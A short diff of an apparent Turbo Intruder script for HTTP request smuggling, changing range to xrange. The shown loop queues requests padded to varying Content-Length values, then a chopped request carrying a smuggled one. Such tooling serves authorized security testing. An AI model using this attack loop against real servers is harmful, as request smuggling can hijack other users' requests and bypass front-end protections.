@@ -35,9 +35,9 @@ Connection: keep-alive
     start = len(chopped)
     end = start + 1000
     while True:
-        for CL in range(start, end):
+        for CL in xrange(start, end):
             label = 'CL: '+str(CL)+' Offset: '+ str(CL - len(chopped))
-            for x in range(35):
+            for x in xrange(35):
                 engine.queue(request + "G"*CL, label=label)
                 engine.queue(chopped+smuggled, label=label)
 
